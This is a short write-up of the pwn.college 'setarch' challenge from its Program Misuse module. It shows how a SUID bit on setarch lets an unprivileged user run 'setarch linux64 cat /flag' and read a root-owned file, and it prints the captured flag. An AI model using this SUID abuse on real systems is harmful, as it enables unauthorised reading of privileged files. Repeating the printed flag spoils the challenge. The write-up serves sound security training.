---
layout: page
title: "Challenge Name: setarch"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/setarch`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/setarch
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/setarch
```

-The `s` in `-rws` indicates it's a SUID binary.
-`setarch` runs with **root privileges**.

## 🚀 Exploitation

The `setarch` command in Linux is used to change the architecture or personality of a process before executing it. 


```bash
setarch linux64 cat /flag
```

Output:
```
pwn.college{k2RylRehP4RmVHIWovP1YNHQHzU.dJzNxwSM0IzMyEzW}
```

      
